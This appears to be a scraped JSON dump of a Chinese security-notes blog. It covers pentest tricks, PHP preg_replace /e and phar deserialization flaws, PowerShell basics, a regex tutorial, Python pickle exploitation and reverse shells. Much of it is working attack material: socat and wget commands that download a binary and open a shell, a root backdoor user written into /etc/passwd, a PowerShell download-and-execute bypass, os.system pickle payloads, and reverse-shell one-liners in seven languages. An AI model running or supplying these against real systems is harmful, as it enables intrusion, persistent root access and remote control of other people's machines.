1socat file:`tty`,raw,echo=0 tcp-listen:4444 受害者 1socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:192.168.3.1:4444 若受害者没有安装 socat，可以下载 Socat - Github 1wget -q https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat -O /tmp/socat; chmod +x /tmp/socat; /tmp/socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:192.168.3.1:4444 使用 netcat 12345678910111213# In reverse shell$ python -c 'import pty; pty.spawn(&quot;/bin/bash&quot;)'Ctrl-Z# In Kali$ stty raw -echo$ fg# In reverse shell$ reset$ export SHELL=bash$ export TERM=xterm-256color$ stty rows &lt;num&gt; columns &lt;cols&gt; find 命令/etc/passwd 中添加用户 字段 含义 用户名 密码 密文 UID GID 默认组ID 注释性描述 宿主目录 登陆后的默认目录 命令解释器 该用户使用的 shell，默认 bash 添加新用户 1234# 生成密码密文perl -le 'print crypt(&quot;H@ck3dPswd&quot;,&quot;salt&quot;)'# 写 /etc/passwdecho &quot;h4ck3r:sa5uB0fsSFsiE:0:0:hacker:/root:/bin/bash&quot; &gt;&gt; /etc/passwd 敏感文件123/etc/passwd/etc/shadow/etc/apache2/.htpasswd.txt 密码爆破john","link":"/2020/04/20/pentest/"},{"title":"PHP 漏洞","text":"PHP 相关 基本思路两种思路：由危险函数回溯寻找可利用的点；或者整体理解代码，寻找其中的可能存在问题的部分审计。 危险函数in_array 类型转换1bool in_array ( mixed $needle, array $haystack [, bool $strict = FALSE ]) 该函数检测数组中是否存在某个值，默认情况下会进行类型转换，将$needle转换为$haystack中元素的类型。 12in_array('1shell', range(0,5));// true preg_replace 的代码执行preg_replace 函数在第一个参数包含 /e修饰符时存在代码执行问题，会将第二个参数当作 php 代码执行。 123456function complex($regex, $value) { return preg_replace('/('.$regex.')/ei', 'strtolower(&quot;\\\\1&quot;)', $value)}function ($_GET as $regex =&gt; $value) { echo complex($regex, $value).&quot;\\n&quot;;} 命令执行时，相当于eval('strtolower(&quot;\\\\1&quot;);')，\\\\1就是\\1，\\1在正则表达式中有自己的含义，指的是第一个子匹配项。 对一个正则表达式模式或部分模式 两边添加圆括号 将导致相关 匹配存储到一个临时缓冲区 中，所捕获的每个子匹配都按照在正则表达式模式中从左到右出现的顺序存储。缓冲区编号从 1 开始，最多可存储 99 个捕获的子表达式。每个缓冲区都可以使用 ‘\\n’ 访问，其中 n 为一个标识特定缓冲区的一位或两位十进制数。 payload: /?.*={${phpinfo()}}，对应 preg_replace('/(.*)/ei', 'strtolower(&quot;\\\\1&quot;)', {${phpinfo()}}); 直接写这个 preg_replace 语句可以执行 phpinfo，但是通过 get 传参时，.会被转换成_，php 会将一些非法的 get 数组参数名转化成下划线，非法字符为首字符时，只有.会被替换成下划线，在其他位置时，ascii码为 32, 43, 46, 91, 95 的也会被替换成下划线。 可以换一个 payload: \\$*=${phpinfo()} 需要匹配到{${phpinfo()}}或者${phpinfo()}才能执行phpinfo函数。因为php存在可变变量，当phpinfo执行之后会返回 true，相当于${1}。 1234567var_dump(phpinfo()); // 结果：布尔 truevar_dump(strtolower(phpinfo()));// 结果：字符串 '1'var_dump(preg_replace('/(.*)/ie','1','{${phpinfo()}}'));// 结果：字符串'11'var_dump(preg_replace('/(.*)/ie','strtolower(&quot;\\\\1&quot;)','{${phpinfo()}}'));// 结果：空字符串''var_dump(preg_replace('/(.*)/ie','strtolower(&quot;{${phpinfo()}}&quot;)','{${phpinfo()}}'));// 结果：空字符串''这里的'strtolower(&quot;{${phpinfo()}}&quot;)'执行后相当于 strtolower(&quot;{${1}}&quot;) 又相当于 strtolower(&quot;{null}&quot;) 又相当于 '' 空字符串 phar 反序列化phar文件结构 stub 格式为 .*&lt;?php.*__HALT_COMPILER\\(\\);?&gt;，即以__HALT_COMPILER()?&gt;结尾的可以被识别为phar文件。 manifest phar文件本质上是一种压缩文件，每个被压缩文件的权限、属性信息存放在这部分，同时用户自定义的meta-data也会以序列化方式存储在这里（核心内容） size(bytes) description 4 Length of manifest in bytes(1 MB limit) 4 Number of files in th Phar 2 API version of the Phar manifest (currently 1.0.0) 4 Global Phar bitmapped flags 4 Length of Phar alias ? Phar alias (length based on previous) 4 Length of Phar metadata (0 for none) ? Serialized Phar Meta-data, stored in serialize() format at least 24*number of entries bytes entries for each file contents 文件内容 signature(optional) 签名，可以添加来验证文件。 demo根据以上信息构建一个phar文件，php内置phar类处理相关操作 要将php.ini中的phar.readonly设置为Off，否则无法生存phar文件。 Ubuntu 中的位置 /usr/local/php/etc/php.ini phar_gen.php: 1234567891011121314&lt;?php class TestObject { } @unlink(&quot;phar.phar&quot;); $phar = new Phar(&quot;phar.phar&quot;); //后缀名必须为phar $phar-&gt;startBuffering(); $phar-&gt;setStub(&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;); //设置stub $o = new TestObject(); $phar-&gt;setMetadata($o); //将自定义的meta-data存入manifest $phar-&gt;addFromString(&quot;test.txt&quot;, &quot;test&quot;); //添加要压缩的文件 //签名自动计算 $phar-&gt;stopBuffering();?&gt; 生成的phar的meta-data部分是以序列化方式存储的。 php的许多文件系统函数在通过 phar://协议解析phar文件时会将meta-data反序列化 受影响的函数 fileatime filectime file_exists file_get_contents file_put_contents file filegroup fopen fileinode filemtime fileowner fileperms is_dir is_executable is_file is_link is_readable is_writable is_writeable parse_in_file copy unlink stat readfile demo 1234567891011&lt;?php class TestObject { public function __destruct() { echo 'Destruct called'; } } $filename = 'phar://phar.phar/a_random_string'; file_exists($filename); //...... ?&gt; 当文件系统函数参数可控时，可以再不调用unserialize()的情况下反序列化。 测试phar_test1.php 12345678910&lt;?php class TestObject { public function __destruct() { echo 'Destruct called'; } } $filename = 'phar://phar.phar/test.txt'; file_get_contents($filename); ?&gt; 运行一下，得到Destruct called。 再试一下file_exist()，phar_test2.php 1234567891011&lt;?php class TestObject { public function __destruct() { echo 'Destruct called'; } } $filename = 'phar://phar.phar/a_random_string'; file_exists($filename); //...... ?&gt; 也可以得到Destruct called 将phar伪造成其他格式文件php识别phar是通过文件头的stub，对其他内容没有要求，因此可以通过添加任意文件头和修改后缀名的方式将phar文件伪造成其他格式的文件。 1234567891011121314&lt;?php class TestObject { } @unlink(&quot;phar.phar&quot;); $phar = new Phar(&quot;phar.phar&quot;); $phar-&gt;startBuffering(); $phar-&gt;setStub(&quot;GIF89a&quot;.&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;); //设置stub，增加gif文件头 $o = new TestObject(); $phar-&gt;setMetadata($o); //将自定义meta-data存入manifest $phar-&gt;addFromString(&quot;test.txt&quot;, &quot;test&quot;); //添加要压缩的文件 //签名自动计算 $phar-&gt;stopBuffering();?&gt; 可以用于绕过上传检测。 利用条件 phar文件能够上传到服务器 有可用的魔术方法作为跳板 文件操作函数参数可控，且 : / phar等没有被过滤 防御 文件系统函数参数可控时，严格检查参数 检查上传文件内容，而不是只检查文件头 可能的话禁用可执行系统命令、代码的危险函数 MD50e00275209979","link":"/2020/05/10/php-vuln/"},{"title":"Powershell笔记","text":"笔记 基础变量强类型语言，大小写不敏感 变量以$开头 1234# 受保护的变量New_variable num -Value 100 -Force -Option readonly# 只能通过 del 删除del $num 数组创建 12345$array = 1,2,3,4$array = 1..4$array = 1,&quot;21&quot;,([System.Guid]::NewGuid()),(get-data)$array=@90 # 空数组$a = ,&quot;1&quot; # 1个元素的数组 访问，通过下标，多行数据每行为一个元素 12$ip = ipconfig$ip[1] 判断 1$test -is [array] 追加 1$array += &quot;asdf&quot; 哈希表创建 1$stu=@{Name = &quot;test&quot;; Age=&quot;12&quot;;Sex=&quot;man&quot;} 插入和删除 123$hashtable = @{}$hashtable.Name = &quot;nnn&quot;$hashtable.Remove(&quot;Name&quot;) 对象powershell 中一切都是对象 Get-Member查看对象结构 1234# 查看对象结构Get-Member# 可以指定查看其中的一部分Get-Member -MemberType Properties Select-Object选择对象的一部分 12345678910# 选择对象的一部分Select-Object# 建仅包括 Win32_LogicalDisk WMI 类的 Name 和 FreeSpace 属性的新对象Get-CimInstance -Class Win32_LogicalDisk | Select-Object -Property Name,FreeSpace# 创建计算属性，改变FreeSpace 的单位Get-CimInstance -Class Win32_LogicalDisk | Select-Object -Property Name, @{ label='FreeSpace' expression={($_.FreeSpace/1GB).ToString('F2')} } Where-Object筛选对象 11,2,3,4 | Where-Object {$_ -lt 3} $_指代当前管道对象 筛选运行中的驱动程序 12Get-CimInstance -Class Win32_SystemDriver | Where-Object {$_.State -eq 'Running'} 进一步筛选，输出对象的一部分信息 1234Get-CimInstance -Class Win32_SystemDriver | Where-Object {$_.State -eq &quot;Running&quot;} | Where-Object {$_.StartMode -eq &quot;Manual&quot;} | Format-Table -Property Name,DisplayName 创建 .NET 对象管理 Eventlog 并存入变量，类似于 向构造函数传参 123456$app = New-Object -TypeName System.Diagnostics.EventLogNew-Object -TypeName System.Diagnostics.EventLog -ArgumentList Application# 远程计算机的日志$RemoteAppLog = New-Object -TypeName System.Diagnostics.EventLog Application,192.168.1.81# 清除日志$RemoteAppLog.Clear() 创建 COM 对象。如创建 WSH 对象：WScript.Shell，WScript.Network，Scripting.Dictionary 和 Scripting.FileSystemObject 1234New-Object -ComObject WScript.ShellNew-Object -ComObject WScript.NetworkNew-Object -ComObject Scripting.DictionaryNew-Object -ComObject Scripting.FileSystemObject 使用 WScript.Shell 创建快捷方式 1234$WshShell = New-Object -ComObject WScript.Shell$lnk = $WshShell.CreateShortcut(&quot;$Home\\Desktop\\PSHome.lnk&quot;)$lnk.TargetPath = $PSHome$lnk.Save() 控制语句123456789101112131415161718192021222324252627282930313233343536373839404142434445-eq ：等于-ne ：不等于-gt ：大于-ge ：大于等于-lt ：小于-le ：小于等于-contains ：包含$array -contains something-notcontains :不包含!($a): 求反-and ：和-or ：或-xor ：异或-not ：逆if-else:if($value -eq 1){ code1}else{ code2}while($n -gt 0){ code}$sum=0for($i=1;$i -le 100;$i++){ $sum+=$i}$sumforeach($file in dir c:\\windows){ if($file.Length -gt 1mb) { $File.Name }}# 获取所有的服务，并获取对呀进程ID是否大于100Get-WmiObject Win32_Service | ForEach-Object {&quot;Name:&quot;+ $_.DisplayName, &quot;, Is ProcessId more than 100:&quot; + ($_.ProcessId -gt 100)} 函数1234567891011121314151617181920function Invoke-PortScan {&lt;#.SYNOPSIS 简介.DESCRIPTION描述.PARAMETER StartAddress参数.PARAMETER EndAddress参数.EXAMPLEPS &gt; Invoke-PortScan -StartAddress 192.168.0.1 -EndAddress 192.168.0.254用例#&gt;code} 异常1Try{ $connection.open() $success = $true }Catch{ $success = $false } 脚本编写与执行执行策略123456789101112Restricted受限制的，可以执行单个的命令，但是不能执行脚本Windows 8, Windows Server 2012, and Windows 8.1中默认就是这种策略，所以是不能执行脚本的，执行就会报错，那么如何才能执行呢？Set-ExecutionPolicy -ExecutionPolicy Bypass就是设置策略为Bypass这样就可以执行脚本了。AllSignedAllSigned 执行策略允许执行所有具有数字签名的脚本RemoteSigned当执行从网络上下载的脚本时，需要脚本具有数字签名，否则不会运行这个脚本。如果是在本地创建的脚本则可以直接执行，不要求脚本具有数字签名。Unrestricted这是一种比较宽容的策略，允许运行未签名的脚本。对于从网络上下载的脚本，在运行前会进行安全性提示。需要你确认是否执行脚本BypassBypass 执行策略对脚本的执行不设任何的限制，任何脚本都可以执行，并且不会有安全性提示。UndefinedUndefined 表示没有设置脚本策略。当然此时会发生继承或应用默认的脚本策略。 绕过 1234567891011Get-ExecutionPolicy获取当前的执行策略Get-Content .\\test.ps1 | powershell.exe -noprofile -通过管道输入进pspowershell -nop -c &quot;iex(New-Object Net.WebClient).DownloadString('http://192.168.1.2/test.ps1')&quot;通过远程下载脚本来绕过$command = &quot;Write-Host 'Hello World!'&quot;$bytes = [System.Text.Encoding]::Unicode.GetBytes($command) $encodedCommand = [Convert]::ToBase64String($bytes) powershell.exe -EncodedCommand $encodedCommand通过BASE64编码执行 使用123456789script.ps1:# 脚本内容function test-conn { Test-Connection -Count 2 -ComputerName $args}# 载入脚本文件.\\script.ps1# 调用函数test-conn localhost 如果脚本是直接写的代码而不是只定义了函数那么直接执行脚本.\\script.ps1即可，但是如果是载入里面的函数需要.+空格+.\\script.ps1，或者使用Import-Module .\\script.ps1, 这样才能直接使用脚本的函数 通过 CMD 执行 powershell 1234567891011121314151617PowerShell[.exe] [-PSConsoleFile &lt;file&gt; | -Version &lt;version&gt;] [-EncodedCommand &lt;Base64EncodedCommand&gt;] [-ExecutionPolicy &lt;ExecutionPolicy&gt;] [-File &lt;filePath&gt; &lt;args&gt;] [-InputFormat {Text | XML}] [-NoExit] [-NoLogo] [-NonInteractive] [-NoProfile] [-OutputFormat {Text | XML}] [-Sta] [-WindowStyle &lt;style&gt;] [-Command { - | &lt;script-block&gt; [-args &lt;arg-array&gt;] | &lt;string&gt; [&lt;CommandParameters&gt;] } ]PowerShell[.exe] -Help | -? | /? base64 执行 whoami 1powershell -EncodedCommand dwBoAG8AYQBtAGkACgA= Socket 编程","link":"/2019/09/07/powershell/"},{"title":"正则表达式","text":"正则表达式（Regular Expression，缩写为 regex 或者 regexp）是一组特殊文本，可以用来从文本中找出满足你想要的格式的部分。From learn regex the easy way 12&quot;the&quot; =&gt; the fat cat sat on the mat.the 表示使用正则表达式 “the”（第一行） 可以匹配到字符串 “the fat cat sat on the mat” 中的 “the”（第二行） 基本匹配正则表达式其实就是执行搜素时的格式，大小写敏感。The表示一个规则，T紧接着h然后是e。 1&quot;The&quot; =&gt; The fat cat sat on the mat. 元字符概述正则表达式主要依赖于元字符，元字符不代表他们的字面意思，具有特殊含义： 元字符 描述 . 匹配任意单个字符，除了换行符 [] 匹配方括号内的任意字符 [^] 匹配方括号内容以外的任意字符 * 匹配任意个（包括0个）*之前的字符 + 匹配至少一个+前的字符 ? 匹配0个或者1个?之前的字符 {n,m} 匹配大于等于n，小于等于m个大括号前的字符 (xyz) 匹配与xyz完全相同的字符串 | 或运算符，匹配该符号前或者后的字符 \\ 转义字符，用于匹配一些保留字符 ^ 从前开始匹配 $ 从后开始匹配 点.12&quot;.ar&quot; =&gt; the car parked in the garagecar, par, gar 字符集字符集[]12&quot;[Tt]he&quot; =&gt; The car parked in the garage.The, the 另外，方括号内的.就表示它本身 12&quot;ar[.]&quot; =&gt; A garage is a good place to park a car.ar. 否定字符集[^]一般说来^表示一个字符串的开头，但放在方括号内的开头时，表示这个字符集时否定的 12&quot;[^c]ar&quot; =&gt; The car parked in the garage.par, gar 重复次数*号匹配在*之前的字符大于等于0次。表达式[a-z]*匹配所有以小写字母开头的字符串。 12&quot;[a-z]*&quot; =&gt; The car parked in the garage #21.he, car, parked, in, the, garage 使用.*可以匹配所有的字符串，\\s*cat\\s*匹配以任意个空格开头，任意个空格结尾的cat 12&quot;\\s*cat\\s*&quot; =&gt; The fat cat set on the concatenation.cat, cat +号匹配+号之前的字符出现至少一次 12&quot;c.+t&quot; =&gt; The fat cat sat on the mat.cat sat on the mat ?号匹配?号之前的字符出现0次或1次 12&quot;[T]?he&quot; =&gt; The car is parked in the garage.The, he {}控制一个或一组字符可出现的次数，{m,n}表示出现大于等于m小于等于n次。可以省略第二个参数，此时表示出现大于等于m次。{m}表示固定出现m次。 12345&quot;[0-9]{2,3}&quot; =&gt; The number was 9.9997 but we rounded it off to 10.0.999, 10&quot;[0-9]{3}&quot; =&gt; The number was 9.9997 but we rounded it off to 10.0.999 ()子模式括号内的内容表示一个子模式，其中可以使用|运算符 123&quot;(c|g|p)ar&quot; =&gt; The car is parked in the garage.car, par, gar |或运算符匹配之前或者之后的内容 12&quot;(T|t)he|car&quot; =&gt; The car is parked in the garage.The, car, the \\转码特殊字符反斜杠\\用于转码紧跟其后的字符，用于指定{}[]/\\+*.$^|?这些特殊字符。 12&quot;(f|c|m)at\\.?&quot; =&gt; The fat cat sat on the mat.fat, cat, mat. 锚点^号仅正则表达式在所匹配字符串的开头时才进行匹配。 12&quot;^(T|t)the&quot; =&gt; The car is parked in the garage.The $号同理于^，$仅正则表达式在所匹配字符串结尾时进行匹配。 12&quot;(at)\\.$&quot; =&gt; The fat cat. sat. on the mat.at. 简写字符集 简写 描述 . 除换行符外的所有字符 \\w 匹配所有字母数字下划线，等同于[a-zA-z0-9_] \\W 匹配所有非字母数字，等同于[^\\w] \\d 匹配数字,[0-9] \\D 匹配非数字 \\s 匹配所有空格字符，[\\t\\n\\f\\r\\p{Z}] \\S 匹配所有非空格字符 \\f 换页符 \\n 换行符 \\r 回车符 \\t 制表符 \\v 垂直制表符 \\p CR/LF，等同于\\r\\n，匹配DOS行终止符 零宽度断言（前后预查）– 未学习先行断言和后发断言都属于非捕获簇(不捕获文本 ，也不针对组合计进行计数). 先行断言用于判断所匹配的格式是否在另一个确定的格式之前, 匹配结果不包含该确定格式(仅作为约束). 例如, 我们想要获得所有跟在 $ 符号后的数字, 我们可以使用正后发断言 (?&lt;=\\$)[0-9\\.]*. 这个表达式匹配 $ 开头, 之后跟着 0,1,2,3,4,5,6,7,8,9,. 这些字符可以出现大于等于 0 次. 零宽度断言如下: 符号 描述 ?= 正先行断言-存在 ?! 负先行断言-排除 ?&lt;= 正后发断言-存在 ?&lt;! 负后发断言-排除 ?=... 正先行断言?=... 正先行断言, 表示第一部分表达式之后必须跟着 ?=...定义的表达式. 返回结果只包含满足匹配条件的第一部分表达式. 定义一个正先行断言要使用 (). 在括号内部使用一个问号和等号: (?=...). 正先行断言的内容写在括号中的等号后面. 例如, 表达式 (T|t)he(?=\\sfat) 匹配 The 和 the, 在括号中我们又定义了正先行断言 (?=\\sfat) ,即 The 和 the 后面紧跟着 (空格)fat. 1&quot;(T|t)he(?=\\sfat)&quot; =&gt; The fat cat sat on the mat. 在线练习 ?!... 负先行断言负先行断言 ?! 用于筛选所有匹配结果, 筛选条件为 其后不跟随着断言中定义的格式. 正先行断言 定义和 负先行断言 一样, 区别就是 = 替换成 ! 也就是 (?!...). 表达式 (T|t)he(?!\\sfat) 匹配 The 和 the, 且其后不跟着 (空格)fat. 1&quot;(T|t)he(?!\\sfat)&quot; =&gt; The fat cat sat on the mat. 在线练习 ?&lt;= ... 正后发断言正后发断言 记作(?&lt;=...) 用于筛选所有匹配结果, 筛选条件为 其前跟随着断言中定义的格式. 例如, 表达式 (?&lt;=(T|t)he\\s)(fat|mat) 匹配 fat 和 mat, 且其前跟着 The 或 the. 1&quot;(?&lt;=(T|t)he\\s)(fat|mat)&quot; =&gt; The fat cat sat on the mat. 在线练习 ?&lt;!... 负后发断言负后发断言 记作 (?&lt;!...) 用于筛选所有匹配结果, 筛选条件为 其前不跟随着断言中定义的格式. 例如, 表达式 (?&lt;!(T|t)he\\s)(cat) 匹配 cat, 且其前不跟着 The 或 the. 1&quot;(?&lt;!(T|t)he\\s)(cat)&quot; =&gt; The cat sat on cat. 在线练习 标志标志也叫模式修正符, 因为它可以用来修改表达式的搜索结果. 这些标志可以任意的组合使用, 它也是整个正则表达式的一部分. 标志 描述 i 忽略大小写. g 全局搜索. m 多行的: 锚点元字符 ^ $ 工作范围在每行的起始. 忽略大小写 (Case Insensitive)修饰语 i 用于忽略大小写. 例如, 表达式 /The/gi 表示在全局搜索 The, 在后面的 i 将其条件修改为忽略大小写, 则变成搜索 the 和 The, g 表示全局搜索. 1&quot;The&quot; =&gt; The fat cat sat on the mat. 在线练习 1&quot;/The/gi&quot; =&gt; The fat cat sat on the mat. 在线练习 全局搜索 (Global search)修饰符 g 常用于执行一个全局搜索匹配, 即(不仅仅返回第一个匹配的, 而是返回全部). 例如, 表达式 /.(at)/g 表示搜索 任意字符(除了换行) + at, 并返回全部结果. 1&quot;/.(at)/&quot; =&gt; The fat cat sat on the mat. 在线练习 1&quot;/.(at)/g&quot; =&gt; The fat cat sat on the mat. 在线练习 多行修饰符 (Multiline)多行修饰符 m 常用于执行一个多行匹配. 像之前介绍的 (^,$) 用于检查格式是否是在待检测字符串的开头或结尾. 但我们如果想要它在每行的开头和结尾生效, 我们需要用到多行修饰符 m. 例如, 表达式 /at(.)?$/gm 表示小写字符 a 后跟小写字符 t , 末尾可选除换行符外任意字符. 根据 m 修饰符, 现在表达式匹配每行的结尾. 123&quot;/.at(.)?$/&quot; =&gt; The fat cat sat on the mat. 在线练习 123&quot;/.at(.)?$/gm&quot; =&gt; The fat cat sat on the mat. 在线练习 贪婪匹配与惰性匹配 (Greedy vs lazy matching)正则表达式默认采用贪婪匹配模式，在该模式下意味着会匹配尽可能长的子串。我们可以使用 ? 将贪婪匹配模式转化为惰性匹配模式。 1&quot;/(.*at)/&quot; =&gt; The fat cat sat on the mat. 在线练习 1&quot;/(.*?at)/&quot; =&gt; The fat cat sat on the mat. 在线练习","link":"/2019/10/07/regularexpression/"},{"title":"Pickle 相关","text":"总结一些Pickle安全相关的东西。 背景1Warning: the pickle module is not intended to be secure angainst erroneous or malicuously constructed data. Never unpickle data received from an untrusted or unauthenticated souorce. 在不同的进程或机器中，函数A向函数B传递一个对象有几种方式：选择一个自定义的协议，实现一个公开的协议或者依赖于自身的框架生成字节流。显然最后一种方式是最简单的，也就是序列化和反序列化。 关键函数：dumps()和loads()。 默认序列化过程： 获取类的实例 从这个对象提取它的所有属性__dict__ 把一系列属性转化为键值对 写入类名 写入键值对 反序列化过程： 获取 pickle 流 重建属性列表 利用存储的类名创建对象 把属性复制进新创建的对象 Pickle 依赖于一个微型的虚拟机，pickle 流实际上就是一个程序，其中指令和数据是交错的。 Pickle virtual machine(PVM) 需要的资源：处理器、栈和存储。 处理器：从0字节处开始读取操作码和参数，处理它们，改变栈和内存，重复以上步骤直到pickle流结束。返回栈顶，作为反序列化的对昂。 存储：基本上是寄存器，实现为Python dict，为PVM提供存储。 栈：临时存储数据、参数和对象，实现为 Python list， PVM指令：操作码占1字节，参数用新行标识（有些指令不接受参数，有些接受多个参数）。 指令集： 1234567891011121314151617181920212223242526272829303132333435363738394041424344MARK = b'(' # push special markobject on stackSTOP = b'.' # every pickle ends with STOPPOP = b'0' # discard topmost stack itemPOP_MARK = b'1' # discard stack top through topmost markobjectDUP = b'2' # duplicate top stack itemFLOAT = b'F' # push float object; decimal string argumentINT = b'I' # push integer or bool; decimal string argumentBININT = b'J' # push four-byte signed intBININT1 = b'K' # push 1-byte unsigned intLONG = b'L' # push long; decimal string argumentBININT2 = b'M' # push 2-byte unsigned intNONE = b'N' # push NonePERSID = b'P' # push persistent object; id is taken from string argBINPERSID = b'Q' # &quot; &quot; &quot; ; &quot; &quot; &quot; &quot; stackREDUCE = b'R' # apply callable to argtuple, both on stackSTRING = b'S' # push string; NL-terminated string argumentBINSTRING = b'T' # push string; counted binary string argumentSHORT_BINSTRING= b'U' # &quot; &quot; ; &quot; &quot; &quot; &quot; &lt; 256 bytesUNICODE = b'V' # push Unicode string; raw-unicode-escaped'd argumentBINUNICODE = b'X' # &quot; &quot; &quot; ; counted UTF-8 string argumentAPPEND = b'a' # append stack top to list below itBUILD = b'b' # call __setstate__ or __dict__.update()GLOBAL = b'c' # push self.find_class(modname, name); 2 string argsDICT = b'd' # build a dict from stack itemsEMPTY_DICT = b'}' # push empty dictAPPENDS = b'e' # extend list on stack by topmost stack sliceGET = b'g' # push item from memo on stack; index is string argBINGET = b'h' # &quot; &quot; &quot; &quot; &quot; &quot; ; &quot; &quot; 1-byte argINST = b'i' # build &amp; push class instanceLONG_BINGET = b'j' # push item from memo on stack; index is 4-byte argLIST = b'l' # build list from topmost stack itemsEMPTY_LIST = b']' # push empty listOBJ = b'o' # build &amp; push class instancePUT = b'p' # store stack top in memo; index is string argBINPUT = b'q' # &quot; &quot; &quot; &quot; &quot; ; &quot; &quot; 1-byte argLONG_BINPUT = b'r' # &quot; &quot; &quot; &quot; &quot; ; &quot; &quot; 4-byte argSETITEM = b's' # add key+value pair to dictTUPLE = b't' # build tuple from topmost stack itemsEMPTY_TUPLE = b')' # push empty tupleSETITEMS = b'u' # modify dict by adding topmost key+value pairsBINFLOAT = b'G' # push float; arg is 8-byte float encoding​TRUE = b'I01\\n' # not an opcode; see INT docs in pickletools.pyFALSE = b'I00\\n' # not an opcode; see INT docs in pickletools.py 生成手写基本模式： 1234c&lt;module&gt;&lt;callable&gt;(&lt;args&gt;tR 例子： 1234cos # import ossystem # 添加 system() 到 stack(S'ls' # 把当前 stack 存到 metastack（保存os.system），清栈，压入 lstR. # t-弹出 stack 的内容，转换为 tuple，压入metastack，压入tuple，R-system(('ls',))，.-结束，返回栈顶元素（system('ls')） 用reduce生成123456import os, pickleclass Test(object): def __reduce__(self): return (os.system,('ls',))pickle.dumps(Test(),protocol=0)# b'cnt\\nsystem\\np0\\n(Vls\\np1\\ntp2\\nRp3\\n.' 缺点为只能执行单一函数，很难构造复杂操作。 利用AST自动化构造Github repo 可以做到： 变量赋值：存到memo，保存memo下标和变量名 函数调用 使用字面量 list 和 dict 成员修改 对象成员变量修改 支持的单行表达式： 变量赋值 - 左值可以是变量名、dict或list成员、对象成员；右值可以是基础类型的字面量、函数调用 函数调用 return - 可返回0或1个参数 参考：PPT，安全客，博客，先知社区","link":"/2020/03/10/pickle/"},{"title":"文件描述符、输入输出重定向及反弹shell","text":"包含常见的反弹shell 文件描述符linux启动时会默认打开三个文件描述符：标准输入（stdin，0）、标准输出（stdout，1）、标准错误（stderr，2），所有的输入输出都由该进程打开的文件描述符控制。 stdin默认绑定键盘，stdout和stderr默认绑定显示器。 当不是从键盘输入时，或者不是输出到显示器时，需要重定向。 重定向bash在执行命令时，先检查命令中是否存在重定向符号，如果时，先将文件描述符重定向，再去除重定向符号，最后执行命令，重定向从左至右解析。 输入重定向&lt;，输出重定向&gt;（覆盖），&gt;&gt;（追加）。 &lt;是对标准输入0重定向，&gt;和&gt;&gt;是对标准输出1重定向。 &amp;&gt;，将标准输出和标准错误都重定向，等价于&gt; ... 2&gt;&amp;1。&gt;将输出重定向，2&gt;&amp;1将错误绑定到标准输出的文件描述符，&amp;是为了说明要重定向到代表标准输出的1，而不是文件名是1的一个文件。 [n]&lt;&amp;[m]和[n]&gt;&amp;[m]都表示把文件描述符n复制到m，个人认为第二种比较好理解。 反弹shell反弹shell就是在攻击机上打开一个端口，等待受害者连接来进行控制。有时对方有防火墙，或者在局域网内无法直接连接，就可以通过反弹shell来连接。本质是把输入、输出和错误都重定向到服务端（攻击机）。 假设攻击机IP 192.168.1.4，受害者IP 192.168.1.5 在攻击者机器上执行 1nc -lvp 4444 在受害者机器上执行 1bash -i &gt;&amp; /dev/tcp/192.168.1.4/4444 0&gt;&amp;1 就拿到了一个反弹shell。 bash -i表示产生一个交互式的bash &gt;&amp; /dev/tcp/192.168.1.4/4444，linux的/dev下存放的是设备文件，本例中是攻击机监听的端口，&gt;&amp;是把标准输出和标准错误重定向到攻击机监听的端口。 0&gt;&amp;1表示把标准输入绑定到标准输出（/dev/tcp/192.168.1.4/4444） 以上就完成了一个经典的反弹shell 常见的反弹shell命令bash版本：1bash -i &gt;&amp; /dev/tcp/10.0.0.1/8080 0&gt;&amp;1 注意某些linux不支持 perl版本:1perl -e 'use Socket;$i=&quot;10.0.0.1&quot;;$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;/bin/sh -i&quot;);};' python版本：123python -c 'import pty; pty.spawn(&quot;/bin/bash&quot;)'python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;10.0.0.1&quot;,1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);' php版本：1php -r '$sock=fsockopen(&quot;10.0.0.1&quot;,1234);exec(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);' ruby版本：1ruby -rsocket -e'f=TCPSocket.open(&quot;10.0.0.1&quot;,1234).to_i;exec sprintf(&quot;/bin/sh -i &lt;&amp;%d &gt;&amp;%d 2&gt;&amp;%d&quot;,f,f,f)' nc版本：1234567nc -e /bin/sh 10.0.0.1 1234rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1nc 10.0.0.1 1234 &gt;/tmp/fnc x.x.x.x 8888|/bin/sh|nc x.x.x.x 9999 java版本1234r = Runtime.getRuntime()p = r.exec([&quot;/bin/bash&quot;,&quot;-c&quot;,&quot;exec 5&lt;&gt;/dev/tcp/10.0.0.1/2002;cat &lt;&amp;5 | while read line; do \\$line 2&gt;&amp;5 &gt;&amp;5; done&quot;] as String[])p.waitFor() 来源：https://p0sec.net/","link":"/2020/01/21/reverse-shell/"},{"title":"RMI","text":"Java RMI（Remote Method Invocation） 简介Java RMI 机制可以获取一个远程主机（JVM）上的对象的引用，使用这个对象时就和它在本地的主机一样。 RMI 可以调用远程对象的方法，传递对象作为参数，同时可以从返回值中获取对象。 RMI 使用对象序列化，有时也使用动态类加载和 security manager 来安全地传输 Java 类。 远程对象和非远程对象远程对象和普通的对象一样通过引用传递，方法调用发生在原来的主机中的原来的对象上。远程主机返回一个对象的引用后，可以通过这个引用调用方法。 非远程对象只是一般的可序列化的对象，它是按值传递的（传递时得到的是原来的复制）。 Stubs and Skeletons调用远程对象方法时，实际上是在调用本地的一串代码，作为远程对象的代理，称为 Stub。 Skeleton 在远程服务器上，是真正的对象的代理，接受来自远程的方法调用并传递给真正被调用的对象。 远程对象的 Stub 和 Skeleton 通过运行 rmic （RMI Compiler）创建。当编译完成后，在远程对象的类中运行rmic。 Remote 